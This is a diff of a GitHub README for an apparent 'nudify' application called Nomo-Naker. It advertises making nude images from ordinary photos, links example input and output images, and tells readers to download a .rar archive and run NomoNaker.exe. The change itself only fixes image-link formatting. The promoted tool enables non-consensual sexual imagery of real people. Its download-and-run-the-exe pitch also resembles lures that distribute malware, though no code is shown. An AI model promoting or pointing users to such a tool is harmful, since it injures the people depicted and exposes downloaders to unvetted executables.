@@ -27,11 +27,12 @@ Best  app to making Nude🔞🔞 from picture💯💯
 ![Input 2](https://github.com/N0Mod/Nomo-Naker/blob/main/src/input-output/input/photo_3_2025-07-09_19-36-39.jpg)
 
 ### Output 2
-![Output 2]([path-to-image4](https://github.com/N0Mod/Nomo-Naker/blob/main/src/input-output/output/photo_4_2025-07-09_19-36-39.jpg))
+![Output 2](https://github.com/N0Mod/Nomo-Naker/blob/main/src/input-output/output/photo_4_2025-07-09_19-36-39.jpg)
 
 ---
 ### tutorial
 [![Download](https://img.shields.io/badge/Download-Software.zip-ff69b4)](https://github.com/N0Mod/Nomo-Naker/releases/download/Nomo/NomoNaker.rar)
 
 1-**extract the zip**
+
 2-**run the Nomonaker.exe and enjoy**
